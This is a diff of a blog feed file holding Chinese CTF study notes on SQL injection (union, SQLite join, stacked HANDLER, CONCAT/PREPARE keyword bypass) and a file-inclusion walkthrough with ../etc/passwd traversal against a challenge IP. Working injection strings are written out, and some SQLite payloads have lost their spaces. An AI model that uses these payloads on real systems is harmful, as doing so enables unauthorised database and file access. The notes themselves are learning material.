-        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL union联合注入</title>
-      <link href="/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
-      <url>/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQL-union联合注入"><a href="#SQL-union联合注入" class="headerlink" title="SQL union联合注入"></a>SQL union联合注入</h1><p>标签（空格分隔）： SQL</p><p>—首先数据库的定义: 数据的组织结构分为数据库(database)、数据表(table)、数据行(row)、字段(field)</p><p>重要点:union的使用,union</p><p>查表用：<code>1&#39; order by (数字)#</code><br>‘&#x2F;&#x2F;该过程的作用是查询有几列，一直查询到不能查询为止<br>&#x2F;&#x2F;#号的作用是将后面的代码给注释掉</p><p>当想将一些弹出的东西给查询失效只需要：<br><code>1&#39; union select 1,2,...(查询所弹出的数组)</code><br>&#x2F;&#x2F;同时得到可以回显的列表<br>&#x2F;&#x2F;目的还是将页面变得整洁，并且得到列</p><p>当想知道某个数据库的名字只用：<br><code>1&#39; union select 1,2(可以回显的列表,但是要求从1一直到可以查询的列但只能到一个比如1，2),database()#</code><br>&#x2F;&#x2F;database()函数的目的就是获取名字<br>&#x2F;&#x2F;数字一定要从1开始到能回显的一个</p><p>想要获取所属的表的名字：<br><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;（）&#39;--+#</code><br>&#x2F;&#x2F;首先group concat(table name)的作用是获取  ‘数据库’  的所有的表的名字并组合成一个字符串，简洁一点说就是知道数据表<br>&#x2F;&#x2F;然后table_name: 信息模式(information_schema)中tables表的列名，包含所有表名<br>&#x2F;&#x2F;查询表information_schema.tables: 系统表，存储了关于数据库中所有表的信息<br>&#x2F;&#x2F;再进行一个限制table_schema&#x3D;’news’: 条件限制，只查询属于”news”数据库的表</p><p>再查询他的列：<br><code>?wllm=2&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;test_tb&#39;--+</code><br>&#x2F;&#x2F;这样可以获得所有的列的名字</p><p>如果有的列的名字带有flag：<br><code>2&#39;union select 1,2,flag from test_tb--+#</code></p><p>‘union select 1,2,flag from test_tb–+#</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
             
         </tags>
       
@@ -429,11 +479,11 @@
     
     
     <entry>
-      <title>预编译拼接字符法</title>
-      <link href="/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/"/>
-      <url>/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/</url>
+      <title>文件包含漏洞</title>
+      <link href="/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
+      <url>/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
       
-        <content type="html"><![CDATA[<h1 id="预编译拼接字符法"><a href="#预编译拼接字符法" class="headerlink" title="预编译拼接字符法"></a>预编译拼接字符法</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>直接concat函数来进行一个拼接字符串的方法<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;  // 结束前面的查询语句</span><br><span class="line"></span><br><span class="line">set @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);  </span><br><span class="line">//将关键字拆分（比如select拆成&#x27;sele&#x27;+&#x27;ct&#x27;）来绕过简单的关键字过滤</span><br><span class="line"></span><br><span class="line">prepare stmt from @sql;  // 准备预处理语句</span><br><span class="line">EXECUTE stmt;  // 执行预处理语句</span><br><span class="line">#</span><br><span class="line">//注释掉原查询剩余部分</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/news/90960">https://xz.aliyun.com/news/90960</a></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; ‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
       
       
       <categories>
@@ -445,7 +495,7 @@
       
         <tags>
             
-            <tag> SQL绕过 </tag>
+            <tag> PHP </tag>
             
         </tags>
       
@@ -479,6 +529,31 @@
     
     
     <entry>
+      <title>预编译拼接字符法</title>
+      <link href="/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/"/>
+      <url>/blog/2026/01/28/%E9%A2%84%E7%BC%96%E8%AF%91%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<h1 id="预编译拼接字符法"><a href="#预编译拼接字符法" class="headerlink" title="预编译拼接字符法"></a>预编译拼接字符法</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>直接concat函数来进行一个拼接字符串的方法<br><code>语法</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;  // 结束前面的查询语句</span><br><span class="line"></span><br><span class="line">set @sql = CONCAT(&#x27;sele&#x27;,&#x27;ct flag from `1919810931114514`;&#x27;);  </span><br><span class="line">//将关键字拆分（比如select拆成&#x27;sele&#x27;+&#x27;ct&#x27;）来绕过简单的关键字过滤</span><br><span class="line"></span><br><span class="line">prepare stmt from @sql;  // 准备预处理语句</span><br><span class="line">EXECUTE stmt;  // 执行预处理语句</span><br><span class="line">#</span><br><span class="line">//注释掉原查询剩余部分</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/news/90960">https://xz.aliyun.com/news/90960</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> SQL绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>SSTI简记</title>
       <link href="/blog/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/"/>
       <url>/blog/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/</url>
@@ -496,56 +571,6 @@
         <tags>
             
             <tag> SSTI </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>SQL堆叠注入</title>
-      <link href="/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
-      <url>/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
-      
-        <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> SQL </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>文件包含漏洞</title>
-      <link href="/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
-      <url>/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-      
-        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; ‘\n’.join(indented_lines)<br>print(formatted_code)</p><p>获得过后再进行代码审计再选择下一步</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> PHP </tag>
             
         </tags>
       
